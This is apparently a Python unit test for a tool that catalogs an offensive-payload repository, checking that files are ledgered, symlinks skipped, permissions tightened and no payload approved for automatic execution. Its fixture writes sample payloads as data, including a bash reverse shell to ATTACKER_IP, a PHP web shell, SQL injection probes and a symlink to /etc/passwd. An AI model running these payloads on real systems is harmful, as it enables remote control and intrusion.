from __future__ import annotations

import json
import os
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "payload_catalog.py"


class PayloadCatalogTest(unittest.TestCase):
    def run_tool(
        self,
        destination: Path,
        *args: str,
    ) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--destination", str(destination), *args],
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

    def fixture(self, root: Path) -> Path:
        source = root / "PayloadsAllTheThings"
        sql = source / "SQL Injection"
        command = source / "Command Injection"
        csrf = source / "Cross-Site Request Forgery"
        sql.mkdir(parents=True)
        command.mkdir()
        csrf.mkdir()
        (source / "LICENSE").write_text("MIT fixture\n", encoding="utf-8")
        (sql / "README.md").write_text(
            "# SQL Injection\n\n## Boolean differential\n\n"
            "```sql\n1 AND 1=1\n```\n\n```sql\n1 AND 1=2\n```\n",
            encoding="utf-8",
        )
        (command / "README.md").write_text(
            "# Command Injection\n\n## Reverse shell\n\n"
            "```bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n```\n",
            encoding="utf-8",
        )
        (csrf / "payload.html").write_text(
            "<form method='POST'><input name='state' value='changed'></form>",
            encoding="utf-8",
        )
        binary = source / "Upload Insecure Files" / "sample.bin"
        binary.parent.mkdir()
        binary.write_bytes(b"\x00\x01\x02")
        script = source / "Upload Insecure Files" / "shell.php"
        script.write_text("<?php system($_GET['cmd']); ?>", encoding="utf-8")
        if os.name != "nt":
            script.chmod(0o755)
            (source / "outside-link.txt").symlink_to(Path("/etc/passwd"))
        return source

    def test_full_catalog_accounts_for_files_and_never_auto_approves_upstream(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = self.fixture(root)
            destination = root / "cache" / "payloads-all-the-things"
            self.run_tool(destination, "sync", "--source", str(source))
            summary = json.loads((destination / "summary.json").read_text(encoding="utf-8"))
            expected_files = 7 if os.name != "nt" else 6
            self.assertEqual(expected_files, summary["files"])
            self.assertGreaterEqual(summary["techniques"], 3)
            self.assertGreaterEqual(summary["payloads"], 4)
            self.assertEqual(0, summary["automatic_execution_approved"])
            ledger = [
                json.loads(line)
                for line in (destination / "source-ledger.jsonl").read_text(encoding="utf-8").splitlines()
            ]
            self.assertEqual(expected_files, len(ledger))
            self.assertTrue(any(item["status"] == "cataloged-binary" for item in ledger))
            self.assertTrue(any(item["status"] == "cataloged-active" for item in ledger))
            if os.name != "nt":
                self.assertTrue(any(item["status"] == "unsupported-symlink" for item in ledger))
                self.assertFalse((destination / "raw" / "outside-link.txt").exists())
            payloads = [
                json.loads(line)
                for line in (destination / "payloads.jsonl").read_text(encoding="utf-8").splitlines()
            ]
            self.assertTrue(
                any(item["suggested_policy"] == "safe-auto-candidate" for item in payloads)
            )
            self.assertTrue(any(item["suggested_policy"] == "blocked" for item in payloads))
            self.assertTrue(all(not item["approved_for_automatic_execution"] for item in payloads))
            self.assertTrue((destination / "raw" / "SQL Injection" / "README.md").is_file())
            if os.name != "nt":
                self.assertEqual(
                    stat.S_IMODE((destination / "raw" / "Upload Insecure Files" / "shell.php").stat().st_mode),
                    0o600,
                )

    def test_update_generates_candidate_diff_without_approving_semantics(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = self.fixture(root)
            destination = root / "catalog"
            self.run_tool(destination, "sync", "--source", str(source))
            readme = source / "SQL Injection" / "README.md"
            readme.write_text(
                readme.read_text(encoding="utf-8")
                + "\n## Syntax marker\n\n```sql\n'\n```\n",
                encoding="utf-8",
            )
            self.run_tool(destination, "sync", "--source", str(source), "--force")
            changes = json.loads(
                (destination / "change-manifest.json").read_text(encoding="utf-8")
            )
            self.assertTrue(changes["payloads"]["added"])
            self.assertFalse(changes["approved_semantics_changed"])
            search = self.run_tool(destination, "search", "Syntax marker")
            self.assertIn("Syntax marker", search.stdout)


if __name__ == "__main__":
    unittest.main()
